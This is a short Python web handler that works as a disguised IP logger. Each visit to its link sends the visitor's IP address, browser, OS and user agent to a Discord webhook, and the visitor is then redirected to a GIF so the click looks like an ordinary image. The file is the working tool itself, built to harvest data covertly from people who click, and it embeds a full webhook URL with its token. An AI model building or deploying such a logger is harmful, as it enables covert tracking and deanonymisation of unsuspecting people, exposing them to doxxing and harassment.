from http.server import BaseHTTPRequestHandler
import json
import requests
import httpagentparser
import os

# Your Discord webhook—paste it here (keep it secret!)
WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"  # ← CHANGE THIS

# Fake image to serve (change if you want)
FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"  # or any direct image link

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Grab visitor info
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            user_agent = self.headers.get('User-Agent', 'Unknown')
            parsed_ua = httpagentparser.detect(user_agent)

            # Build log message
            log = f"**New click!**\nIP: `{ip}`\nBrowser: {parsed_ua.get('browser', {}).get('name', 'Unknown')} {parsed_ua.get('browser', {}).get('version', '')}\nOS: {parsed_ua.get('os', {}).get('name', 'Unknown')}\nUA: `{user_agent}`"

            # Send to Discord
            requests.post(WEBHOOK_URL, json={"content": log})

            # Redirect or serve image (Discord likes direct image)
            self.send_response(302)
            self.send_header('Location', FAKE_IMAGE_URL)
            self.end_headers()

        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_HEAD(self):
        self.do_GET()  # For HEAD requests
